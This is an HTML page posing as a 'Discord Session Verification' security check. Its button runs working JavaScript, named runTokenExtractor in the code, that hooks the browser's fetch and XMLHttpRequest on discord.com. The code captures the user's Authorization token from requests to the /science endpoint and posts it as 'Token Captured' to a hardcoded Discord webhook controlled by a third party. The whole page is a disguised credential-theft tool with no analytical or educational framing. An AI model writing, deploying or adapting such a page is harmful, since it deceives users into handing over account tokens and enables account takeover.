<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Session Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #2f3136;
            padding: 32px;
            border-radius: 5px;
            max-width: 600px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
        }
        p {
            color: #b9bbbe;
            margin-bottom: 24px;
        }
        button {
            padding: 12px 24px;
            background-color: #5865f2;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Session Verification</h1>
        <p>Click below while on Discord to verify your account status. This ensures your session is secure.</p>
        <button onclick="runTokenExtractor()">Verify Session</button>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1375083886199181353/1dK2QCQMfKi6zYZ46tEWDuy_vCsm5wUy3_YLxOEGFjns__v77Gw7IsWrdcCmiwaBVLKb";

        // Centralized error logging
        function logError(context, error, extra = {}) {
            const timestamp = new Date().toISOString();
            let message = `[${timestamp}] ERROR in ${context}: ${error.message || error}`;
            if (extra.status) message += ` (Status: ${extra.status} ${extra.statusText || ''})`;
            if (extra.url) message += ` (URL: ${extra.url})`;
            if (extra.response) message += ` (Response: ${extra.response})`;
            console.error(message);
        }

        function runTokenExtractor() {
            if (!window.location.href.includes("discord.com")) {
                alert("Please run this on discord.com (e.g., https://discord.com/channels/@me)");
                try {
                    window.open("https://discord.com/channels/1322328218279088128/1327050794020900987", "_blank");
                } catch (error) {
                    logError("Opening Discord URL", error);
                }
                return;
            }

            // Inject token extraction script
            (function() {
                let tokenFound = false;

                function waitForPageLoad() {
                    return new Promise((resolve, reject) => {
                        try {
                            if (document.readyState === "complete") {
                                resolve();
                            } else {
                                window.addEventListener("load", resolve, { once: true });
                            }
                        } catch (error) {
                            logError("waitForPageLoad", error);
                            reject(error);
                        }
                    });
                }

                const originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url) {
                    try {
                        this.addEventListener("readystatechange", function() {
                            try {
                                if (this.readyState === 4) {
                                    if (url.includes("discord.com/api/v9/science")) {
                                        if (this.status !== 200) {
                                            logError("XMLHttpRequest to /science", new Error("Request failed"), {
                                                status: this.status,
                                                statusText: this.statusText,
                                                url,
                                                response: this.responseText.slice(0, 100)
                                            });
                                        }
                                        const token = this.getRequestHeader("Authorization");
                                        if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                            sendToWebhook(token, "Science Endpoint");
                                            tokenFound = true;
                                        }
                                    }
                                }
                            } catch (error) {
                                logError("XMLHttpRequest handler", error, { url });
                            }
                        }, false);
                        originalOpen.apply(this, arguments);
                    } catch (error) {
                        logError("XMLHttpRequest open override", error, { url });
                    }
                };

                const originalFetch = window.fetch;
                window.fetch = async function(url, options = {}) {
                    try {
                        if (url.includes("discord.com/api/v9/science")) {
                            const token = options.headers?.Authorization || options.headers?.authorization;
                            if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                sendToWebhook(token, "Science Endpoint");
                                tokenFound = true;
                            }
                        }
                        const response = await originalFetch.apply(this, arguments);
                        if (url.includes("discord.com/api/v9/science") && !response.ok) {
                            logError("Fetch to /science", new Error("Request failed"), {
                                status: response.status,
                                statusText: response.statusText,
                                url
                            });
                        }
                        return response;
                    } catch (error) {
                        logError("Fetch override", error, { url });
                        throw error;
                    }
                };

                async function sendToWebhook(token, source) {
                    const payload = {
                        content: "",
                        embeds: [{
                            title: "Token Captured",
                            description: `**Token**: ${token.substring(0, 10)}...\n**Source**: ${source}\n**Captured At**: ${new Date().toISOString()}`,
                            color: 0x7289da
                        }],
                        username: "Token Extractor",
                        avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
                    };

                    try {
                        const response = await fetch(WEBHOOK_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        });
                        if (!response.ok) {
                            logError("sendToWebhook", new Error("Webhook request failed"), {
                                status: response.status,
                                statusText: response.statusText,
                                url: WEBHOOK_URL,
                                response: await response.text().slice(0, 100)
                            });
                        } else {
                            console.log(`[${new Date().toISOString()}] Webhook sent successfully`);
                        }
                    } catch (error) {
                        logError("sendToWebhook", error, { url: WEBHOOK_URL });
                    }
                }

                async function triggerScienceRequest() {
                    try {
                        if (!window.location.href.includes("discord.com")) {
                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                            return;
                        }
                        const response = await fetch("https://discord.com/api/v9/science", {
                            method: "POST",
                            headers: {
                                "Authorization": localStorage.getItem("token") || "",
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ event_name: "app_opened", properties: {} })
                        });
                        if (!response.ok) {
                            logError("triggerScienceRequest", new Error("Science request failed"), {
                                status: response.status,
                                statusText: response.statusText,
                                url: "https://discord.com/api/v9/science"
                            });
                        }
                        window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                    } catch (error) {
                        logError("triggerScienceRequest", error, { url: "https://discord.com/api/v9/science" });
                    }
                }

                async function monitorNetwork() {
                    if (tokenFound) return;
                    try {
                        await waitForPageLoad();
                        await triggerScienceRequest();
                    } catch (error) {
                        logError("monitorNetwork", error);
                    }
                    setTimeout(monitorNetwork, 10000);
                }

                try {
                    if (!window.location.href.includes("discord.com")) {
                        window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                    } else {
                        console.log(`[${new Date().toISOString()}] Starting network monitoring`);
                        monitorNetwork();
                    }
                } catch (error) {
                    logError("Script initialization", error);
                }
            })();
            alert("Session verification initiated. You may close this page.");
        }
    </script>
</body>
</html>
